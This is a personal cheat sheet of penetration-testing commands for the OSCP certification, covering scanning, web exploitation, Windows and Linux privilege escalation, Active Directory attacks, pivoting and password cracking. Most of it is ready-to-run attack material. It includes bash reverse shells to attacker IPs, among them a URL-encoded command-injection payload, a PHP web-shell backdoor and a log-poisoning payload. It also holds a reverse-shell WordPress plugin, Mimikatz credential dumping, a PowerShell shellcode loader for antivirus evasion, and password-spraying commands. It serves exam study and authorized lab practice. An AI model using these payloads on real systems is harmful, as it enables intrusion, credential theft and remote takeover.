---
layout: single
title: "OSCP Notes"
permalink: /oscp_notes/
author_profile: true
---

Disclaimer - This page is meant as a personal reference page for particular syntax and reminders of things to check for the OSCP specifically. There exist better places on the internet to learn penetration testing concepts and commands. Furthermore, this template is rendering markdown in a way that is not consistent with any editor I seem to find. As such, some tweaks may be required. 

# Preliminary Scanning 
## nmap
-   Initial scan: output=$(sudo nmap -p- $IP --min-rate 500); echo "$output"; echo -n "Ports: "; echo "$output" \| grep '/tcp' \| cut -d '/' -f 1 \| paste -sd ','
-   Then more detailed: Nmap -A -sC -p($ports) $IP
	- Where the open ports from the previous scan follow the -p flag
	- Ex: -p22,80,445
- Nmap -sU $IP
- Nmap Scripting Engine
	- The nmap scripting engine can also be used for more thorough scanning
	- nmap --script=\<script1>\.nse, \<script2>\.nse $IP
		- Find scripts: grep \<search term>\ /usr/share/nmap/scripts/*.nse
		- Help on script: nmap --script-help=\<script.nse> <br>

## nmapAutomator (https://github.com/21y4d/nmapAutomator)
- ./nmapAutomator.sh --host \<Target IP> --type Full (or Network/Port/Script/All/UDP/Vulns/Recon)

# Web
## Directory Scanning
### Gobuster
- gobuster dir -u http://host -w /usr/share/wordlists/$wordlist.txt
- EX: gobuster dir -u http://host -w /usr/share/wordlists/dirb/common.txt -t 5
- gobuster dir -u http://hosts -w /wordlists/Discovery/Web-Content/big.txt -t 4 --delay 1s -o results.txt
	- Where the resulting output is called results.txt
- gobuster dir -u https://host -w /wordlists/$wordlist.txt  -x .php, .txt  -t 4
	- Where you are searching for php and txt files <br>

### feroxbuster 
- feroxbuster -u \<url>
- feroxbuster -u \<url> -w \<wordlists>
- feroxbuster -u \<url> -t \<number_of_threads>
- feroxbuster -u \<url> --timeout \<timeout_in_seconds>
- feroxbuster -u \<url> --filter-status 404,403,400 --thorough -r
- feroxbuster -u \<url>:\<alternative port>
- feroxbuster -u \<url> --extensions php,rb,txt

## Directory Traversal
On Linux, we can use the /etc/passwd file to test directory traversal vulnerabilities. On Windows, we can use the file C:\Windows\System32\drivers\etc\hosts to test directory traversal vulnerabilities, which is readable by all local users. In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of /etc/passwd. Check for private keys in their home directory, and use them to access the system via SSH.
- https://github.com/jcesarstef/dotdotslash/blob/master/match.py

## Encoding Notes
%20 = " " and %5C = "\"
Note: Don't encode the "-" character in flags, and it looks like "/" characters also don't need to be encoded. 
https://www.urlencoder.org/
- EX: curl http://<URL>.com/<example>/uploads/backdoor.pHP?cmd=type%20..%5C..%5C..%5C..%5Cxampp%5Cpasswords.txt
	- where backdoor is the cmd script in the RFI section below that has already been uploaded to the Windows machine so that we can read the passwords.txt file. <br>
- When there is a username field, password field, and additional called MFA - From: "&&bash -c "bash -i >& /dev/tcp/192.168.45.179/7171 0>&1""
- Becomes: username=user1&password=pass1&ffa=testmfa"%26%26bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.179%2F7171%200%3E%261%22"
	- So make sure to enclose command in "&&\<encodedcommand>" (incl. quotes).

## LFI
- Executing a file on the server, though we may have to modify it first somehow.  
- Ex: if the server stores access logs, modify the access log such that it contains our code, perhaps in the user agent field.
	1. Change this: "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
Firefox/91.0"
	2. To this: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
	3. Then change the request to include "cmd=ls" to test
	4. \<server>/file.php?page=. . / . ./log&cmd=ls 
	- Note that it may need to be URL encoded if your command contains spaces i.e. ls&20-la for "ls -la"
	5. Then one liner shell:
		- bash -c "bash -i >& /dev/tcp/\<kali IP>/\<kali port> 0>&1"
		- URL encoded though
	- On a Windows target running XAMPP, the Apache logs can be found in C:\xampp\apache\logs\.
	- On a Linux target Apache’s access.log file can be found in the /var/log/apache2/ directory.
- There are other examples of LFI, including uploading a reverse shell to a web application and calling it through the URL. The above is just one example of the concept. 

### PHP Wrappers
Note that in order to exploit these vulnerabilites, the allow_url_include setting needs to be enabled for PHP, which is not the case for default installations. That said, it is included in the material, so it makes sense to be aware of it. 
Ex: exploiting a page called admin.php
-  curl http://\<host>/\<directory>/index.php?page=admin.php
-  Note that if the /<body> tag is not closed (with a \</body> tag at the end), the page could be vulnerable. Let's try to exploit it with the **php://filter** tag. 
	1. curl http://\<host>/\<directory>/index.php?page=php://filter/**convert.base64-encode**/resource=admin.php
		- This should return the whole page which can then be decoded for further information. 
	2. echo "\<base64 text>" | base64 -d 
- Now let's try with the **data://** warpper. 
	1. curl "http://\<host>/\<directory>/index.php?page=**data://text/plain**,<?php%20echo%20system('ls');?>"
		- This shows that we can execute embeeded data via LFI. 
	2. But because some of our data like "system" may be filtered, we can encode it with base64 and try again. 
	3. echo -n '<?php echo system($_GET["cmd"]);?>' \| base64
		- PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
	4. "http://\<host>/\<directory>/index.php?page=**data://text/plain;base64**,PD9waHAgZW
NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"

## RFI
- Executing on our file on the server. 
- In PHP web applications, the allow_url_include option needs to be enabled to leverage RFI. This is rare and disabled by default in current versions of PHP
	- [Example backdoor script](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/simple-backdoor.php):
    <?php

	    if(isset($_REQUEST['cmd'])){
	            echo "<pre>";
	            $cmd = ($_REQUEST['cmd']);
	            system($cmd);
	            echo "</pre>";
	            die;
	    }
	    ?>
	- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
	- curl"\<target>/index.php?page=http://\<kali server>/backdoor.php&cmd=ls"

## XSS
[Cheatsheet](https://notchxor.github.io/oscp-notes/2-web/xss/) from notchxor.
## SQLi
[Rana Kalil Video playlist](https://www.youtube.com/watch?v=X1X1UdaC_90&list=PLuyTk2_mYISItkbigDRkL9BFpyRenqrRJ)
[SQLi Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) from Codingo

# SQL
## mysql
- From kali: mysql --host <IP> -u root -proot
	- note that there is no space between -p flag and password
- From target: mysql -u user -p database (p flag is db password, have to enter that after)
### Commands
- select system_user();
- select version();
- show databases;
- SELECT * FROM \<table name> WHERE \<column>='\<field>'

## mssql
### Commands
- SELECT @@version;
- SELECT name FROM sys.databases; (to list all available db's)
	- master, tempdb, model, and msdb are default
- SELECT * FROM \<non-default db>.information_schema.tables;
	- select * from \<non-default db>.dbo.\<table>;
### xp_cmdshell
1. EXECUTE sp_configure 'show advanced options', 1;
2. RECONFIGURE
3. EXECUTE sp_configure 'xp_cmdshell', 1;
4. RECONFIGURE;
5. EXECUTE xp_cmdshell 'whoami';

# SMB
- smbclient -L \<target> -N
- smbclient -L \<target> -U \<user>
- smbclient //\<target>/\<share> -U \<user>%\<password>
- smbclient //\<target>/\<share> -U \<user> --pw-nt-hash \<NTLM hash>
- smbclient //\<target>/\<share> --directory path/to/directory --command "get file.txt"
	- to download file
- smbclient //\<target>/\<share> --directory path/to/directory --command "put file.txt"
	- to upload file
- smbmap -H $IP -u ""
	- to check for available shares
<br>

# SMTP <br>

### onesixtyone
- onesixtyone -c \<file containing community strings (public, private, manager)> -i \<file containing target ips>
- Note that there are seclists with common community strings
	- SecLists/Miscellaneous/wordlist-common-snmp-community-strings.txt
	- SecLists/Miscellaneous/snmp.txt

<br>
### snmpwalk
- snmpwalk -c public -v1 -t 10 \<target ip>
	- other community strings besides public include private and manager
- snmpwalk -c public -v1 192.168.50.151 \<OID string>

	|OID| Target |
	|--|--|
	| 1.3.6.1.2.1.25.1.6.0 | System Processes |
	| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
	| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |
	| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |
	| 1.3.6.1.2.1.25.6.3.1.2  | Software Name |
	| 1.3.6.1.4.1.77.1.2.25 | User Accounts |
	| 1.3.6.1.2.1.6.13.1.3 | TCP Local Ports |
- snmpwalk -Os -c public -v 1 \<host> system
	- to retrieve all
	- try 'v 2c' as well 

# Windows Foothold
## Enumeration
### cmd
whoami
whoami /groups - display groups of current user
whoami /priv
net user - get list of all local users
net user steve - get user info for steve
net group - all local groups

### Powershell
Get-LocalUser - get list of all local users
Get-LocalUser steve - same as net user steve
Get-LocalGroup - all local groups
Get-LocalGroupMember <group name> - list of users in that group
systeminfo - OS, version, architecture, etc
ipconfig /all - list all netwrok interfaces
route print - display routing table contaning all routes of the system
netstat -ano - liust all active network connections
  -a = all active TCP connections as well as TCP and UDP ports
  -n = disable name resolution
  -o = show process ID for each connection
  Displays 32 bit applications, remove 'select displayname' for more info
  - Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" \| select displayname

 Displays 64 bit applications, remove 'select displayname' for more info
 - Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" \| select displayname
 
Get-Process - show running processes
Get-Process \<processName> | Format-List * - get all information about a process

runas user\:<username> cmd 
  - will have to enter password after, but it gets a shell as that user

Get-History - may not work
(Get-PSReadlineOption).HistorySavePath
  -Then cat or type output file and check that output for interesting files

 Command for finding ".kdbx" files:
	- Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue (for Keepass db)
- Download file from remote server
	- iwr -uri http://\<server IP>/file.ext -outfile file.ext\
<br>

### Checking privileges on service binaries
  - icacls (Windows utility) or  
  - Get-ACL (PowerShell Cmdlet)
<br>

### Auto Tools
- ./winpeas.exe
- ./adPEAS.ps1
- powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

<br>
## Active Directory (https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

### PowerView.ps1
(Import-Module .\PowerView.ps1)
(May Need "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser")
- Get-NetDomain
- Get-NetUser
- Get-NetUser \| select cn (common name)
- Get-NetUser \| select cn,pwdlastset,lastlogon
- Get-NetGroup \| select cn
- Get-NetGroup "Fart Department" \| select member (get members of the Fart Department)
- Get-NetComputer
- Get-ObjectAcl -Identity <username>
- Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
          - (For example, pick different items to select)
- Convert-SidToName <SID> (like S-1-5-21-1987370470-658905705-1781884369-1103)
- Find-LocalAdminAccess (scanning to find local admin privileges for our user)

- Get-NetSession -ComputerName <name of computer>
(The permissions required to enumerate sessions with NetSessionEnum are defined in the SrvsvcSessionInfo registry key, which is located in the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity hive.)
- Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ \| fl
- Get-NetUser -SPN | select samaccountname,serviceprincipalname
          (Another way of enumerating SPNs is to let PowerView enumerate all the accounts in the domain. To obtain a clear list of SPNs, we can pipe the output into select and choose the samaccountname               and serviceprincipalname attributes)
- Find-DomainShare
- ls \\\dc1.corp.com\sysvol\corp.com\ (for example)
- cat \\\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
          - gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
### Rubeus usage
- .\Rubeus.exe asreproast /nowrap (Displays the vulnerable user and their AS-REP hash)
- .\Rubeus.exe kerberoast /outfile:hashes.kerberoast (Displays the vulnerable user and their TGS-REP hash)
<br>

## Privilege Escalation
<br>
### Mimikatz
 1. privilege::debug
 2. token::elevate
 3. lsadump::sam
 4. sekurlsa::logonpasswords
 5. lsadump::dcsync /user:\<domain>\\\<user> (to obtain NTLM hash)
	 -  impacket-secretsdump -just-dc-user <user> \<domain.com>/\<user>:"\<password>"@\<ip>
	 - impacket-psexec -hashes 00000000000000000000000000000000:\<NTLM hash> Administrator@\<IP> 

### PowerUp.ps1
Import-Module ./PowerUp.ps1
Invoke-AllChecks
- Check Abuse Function which gives necessary command

### Potato Family
- PrintSpoofer: .\PrintSpoofer.exe -c "nc.exe \<kali $IP> \<listening port> -e cmd"
- GodPotato:  .\GodPotato -cmd “nc -t -e C:\Windows\System32\cmd.exe \<kali IP> \<port>
- .\SweetPotato.exe -e efsrpc '/temp/r.exe'
  

# Linux Foothold
## Enumeration
- id
- sudo -l
- cat /etc/passwd
	- If you can somehow edit:
	- openssl passwd \<new password>
	- echo "\<new user>:\<hash from above>:0:0:root:/root:/bin/bash" >> /etc/passwd
	-  or simply copy \<hash from above> into root:<this spot>:etc within the /etc/passwd file
- cat /etc/issue
- uname -a
- hostname
- ps -aux
	- watch -n 1 "ps -aux \| grep pass"
- ipconfig
- ss -anp or netstat
- dpkg -l (to list applications installed by dpkg)
- find / -writable -type d 2>/dev/null (find writable directories)
- find / -type f -perm -u=s 2>/dev/null
- cat any /home/.history files
- check /home/.ssh for keys
- su root (can't hurt to try)
- sudo tcpdump -i lo -A \| grep "pass"

## Privilege Escalation
### Automated tools
- linpeas.sh
- unix-privesc-check
### SUID Executables - taken from [here](https://medium.com/@balathebug/linux-privilege-escalation-by-using-suid-19d37821ed12)
- find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
- find / -uid 0 -perm -4000 -type f 2>/dev/null
OR
- find / -perm -u=s -type f 2>/dev/null
OR
- find / -user root -perm -4000 -print 2>/dev/null
- find / -perm -u=s -type f 2>/dev/null
- find / -user root -perm -4000 -exec ls -ldb {} \;

# Port Forwarding
## Ligolo
[Guide)[https://medium.com/@Thigh_GoD/ligolo-ng-finally-adds-local-port-forwarding-5bf9b19609f9] <br>
**Basic usage**
<br>
From Kali:
1. sudo ip tuntap add user pop mode tun ligolo
2. sudo ip link set ligolo up
3. sudo ip route add \<target ip.0/24> dev ligolo
4. ./proxy -selfcert
<br>
From Windows Target (agent file):
1. .\ligolo.exe -connect \<kali IP>:11601 -ignore-cert
<br>
From Linux Target (agent file):
1. ligolo -connect \<kali IP>:11601 -ignore-cert
<br>
Then from Kali:
1. Session
2. 1
3. Start
4. listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:6666
	- This allows you to access port 5555 on target from 127.0.0.1:6666 (kali machine). 
<br>
 **Local Port Forwarding:**
	- `ip route add 240.0.0.1/32 dev`
	- **240.0.0.1** will point to whatever machine Ligolo-ng has an active tunnel on. If there is an internal web server on port 5555, it can be accessed from kali on 240.0.0.1:5555
<br>

## Other tools
While the OSCP Lab discusess other tools such as socat, sshuttle, and plink, I found that [Ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) was about to provide all of the same functionality and more simply. That said, I am linking a guide discusess the other tools. Here is frankyyano's [Pivoting & Tunneling guide](https://medium.com/@frankyyano/pivoting-tunneling-for-oscp-and-beyond-33a57dd6dc69). 

# File Sharing
### Python server
- From kali: python3 -m http.server \<serving port>
- From target Windows: 
	- powershell - iwr -uri http://\<kali IP>:\<serving port>/file -outfile file
- From target Linux:
	- wget http://\<kali IP>:\<serving port>/file
<br>

### Over nc
1. on target: nc -w 3 192.168.45.230 4444 < file.txt
2. on kali: nc -lvnp 4444 > file.txt
### Over RDP
- xfreerdp /u:admin /p:password /v:10.10.172.151 /drive:/directory, $sharename
<br>

### SMB
- From kali: 
	- sudo impacket-smbserver -smb2support share . -username <kali user> -password <kali pass>
- From target:  
	- net use m: \\\<kali IP>\share /user:<kali user> <kali pass>
	- copy/get file.txt m:\
<br>

### SSH/SCP
scp -P $SSHport $filetocopy user@$destIP:$destFolder
<br>

### wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root $directoryToShare
- host specifies the host to listen to, "0.0.0.0" means all interaces, "--auth=anonymous" disables authentication (fine for sharing specific files during this context), and the "--root" flag specifies the directory to share. 


# Tool Syntax
## Netexec (formerly crackmapexec)
nxc smb $IP -u $user -p '$password' -d domain.com --continue-on-success

## Kerbrute
.\kerbrute_windows_amd64.exe passwordspray -d domain.com $usersfile "$password"

## Impacket
### mssqlclient
impacket-mssqlclient \<user>:\<pass>@\<target> -windows-auth
### psexec 
### wmiexec
- impacket-wmiexec -hashes :$NTLMhash Administrator@$target (can be 0/24)
	- Requires an SMB connection through the firewall, the Windows File and Printer Sharing feature must be enabled, and the admin share called ADMIN$ must be available. 
<br>

## Metasploit

### Initial Usage
Selecting a module:
  - show auxiliary - shows auxiliary modules
  - search type:auxiliary smb - searches for auxiliary modules which include smb
  - info - after selecting learn more about the module
  - vulns - after running check to see if there were any discovered
  - creds - check for any creds discovered during the use of msfconsole
  - search Apache 2.4.49 - search for Apache 2.4.49 exploits
 Dealing with sessions:
  - sessions -l - list sessions 
  - sessions -i 2 - initiate session 2
Dealing with channels (meterpreter):
  - ^Z - background channel - y
  - channel -l - list channels
  - channel -i - channel -i 1
Dealing with jobs:
  - run -j
  - jobs - checks for runnign jobs

Local commands:
  - lpwd - local (attacking machine) pwd
  - lcd - local (attacking machine) cd
  - upload /usr/bin/<binary> /tmp/ - uploads binary such as linux-privesc-check from Attacking machine to target

Payloads (msfvenom)
  - msfvenom -l payloads --platform windows --arch x64 - lists payloads for windows 64 bit 
  - msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.157 LPORT=443 -f exe -o nonstaged.exe - creates a reverse shell tcp payloads on that for attacker (LHOST) with the exe format and the name nonstaged.exe
  - iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe (execute from Target to download shell)
    - use nc -lvnp 443 or multi/handler
  - use multi/handler - exploit in msf
  - set payload windows/x64/shell/reverse_tcp - so either set up in nc or msfconsole's multi/handler

### Post Exploit 
- idletime (meterpreter) - check that user's idletme
- shell - switch to shell
  - whoami /priv 
- getuid - check user (*from meterpreter*)
- getsystem - elevate privileges from meterpreter
- ps 
  - then migrate $PID (check to see if other users are running it)
  - execute -H -f notepad
    - -H = hidden, -f = program
- Check Integrity Level of current process:
  - shell
  - powershell -ep bypass
  - Import-Module NtObjectManager
  - Get-NtTokenIntegrityLevel 
    - If that doesnt work then move on, if it does:
      - search UAC - search for UAC bypass modules
      - use exploit/windows/local/bypassuac_sdclt
        - set SESSION \<x><br>
- From meterpreter:
  - load kiwi (loads mimikatz)
  - help - shows all commands, including creds_msv

## Password Attacks
### Hydra
- hydra -l $user -P /usr/share/wordlists/rockyou.txt -s \<alternate port> ssh://$IP
- hydra -L /usr/share/wordlists/dirb/others/names.txt -p "$knownPass" rdp://$IP
- hydra -l $user -P /usr/share/wordlists/rockyou.txt $IP http-post-form " /index.php:fm_usr=user&fm_pwd=\^PASS^:Login failed. Invalid"
- Basic Auth
	- hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.206.201 http-get
<br>
### Hashcat
- hashcat -m 0 $hashFile /usr/share/wordlists/rockyou.txt -r 15222.rule --force --show
- hashcat -m 13400 $keepassHash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show
- check hashcat for which mode to use (searching for KeePass in this case)
	- hashcat --help \| grep -i "KeePass" 
	- hashcat -h \| grep -i "ssh"
<br>
### john the ripper
- ssh2john id_rsa > ssh.hash 
- keepass2john $dbName.kdbx > keepass1.hash
<br>
## ssh

### creating ssh key
- ssh-keygen
- ssh -p 2222(unless 22) -i created_key(no pub) user@host.com
- Using a -d_sa (private key) from /home/user/.ssh/id_sa
<br>
### Finding key protected by password: if ssh key protected by a password
1. may need to chmod 600 id_rsa (too many permissions won't work)
2. ssh2john id_rsa > ssh.hash
3. remove "id_rsa:" from ssh.hash
4. hashcat -h \| grep -i "ssh" (22921 for example)
5. hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force

## Swaks (Sending email from command line when you have creds for mail server)
- swaks --to <recipient@email.com> --from <sender@email.com> -ap --attach @<attachment> --server \<mail server ip> --body "message" --header "Subject: Subject" --suppress-data
	- You will need the password of the mail server user (likely the sender)
	- Note that the mail server may not be the same machine as the user who opens the email
<br>
## Wordpress Cheatsheet
### wpscan
- wpscan --url http://$URL --api-token $APIToken
### reverse shell Wordpress plugin

	    <?php
	    
	    /**
	    * Plugin Name: Reverse Shell Plugin
	    * Plugin URI:
	    * Description: Reverse Shell Plugin
	    * Version: 1.0
	    * Author: Vince Matteo
	    * Author URI: http://www.sevenlayers.com
	    */
	    
	    exec("/bin/bash -c 'bash -i >& /dev/tcp/<kali_IP>/<kali_port> 0>&1'");
	    ?>




# Miscellaneous Topics
## Antivirus Evasion
As these are my OSCP notes, and AV Evasion is outside the scope of the exam, I'm mostly leaving this content out of the guide for brevity. Below is a script for manual exploitation. It must be saved as an *.ps1 file, transferred to the victim Windows machine, and ran (after powershell -ep bypass). 

    $code = '
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("msvcrt.dll")]
    public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
    
    $winFunc = 
      Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
    
    [Byte[]];
    [Byte[]]$sc = <place your shellcode here>;
    
    $size = 0x1000;
    
    if ($sc.Length -gt 0x1000) {$size = $sc.Length};
    
    $x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
    
    for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
    
    $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

For the field that says "place your shellcode here," such code can be generated using msfvenom like this:
- msfvenom -p windows/shell_reverse_tcp LHOST=\<kali IP> LPORT=443 -f powershell -v sc 



## Buffer Overflow
As these are my OSCP notes, and there is no longer a buffer overflow machine on the exam, I'm leaving this content out of the guide for brevity. Instead I'll link a resource which turned out to be better and more succinct than the notes I took on the subject when I went through the course. Here is [V1n1v131r4's guide on Buffer Overflows](https://github.com/V1n1v131r4/OSCP-Buffer-Overflow). 
<br>
## Upgrading Shells to fully interactive
<br>
### Python
1. python3 -c 'import pty; pty.spawn("/bin/bash")'  (or python)
2. background reverse shell using CTRL-Z
3. echo $TERM
4. stty -a
	5. Take note of the TERM type and size of the tty 
		6. Ex: xterm-256 color and rows 38; columns 116
5. Then with the reverse shell still in background "stty raw -echo"
6. fg
7. reset
8. export SHELL=bash
9. export TERM=xterm-256 color (for example)
10. stty rows 38 columns 116 
<br>
### Without Python
script /dev/null
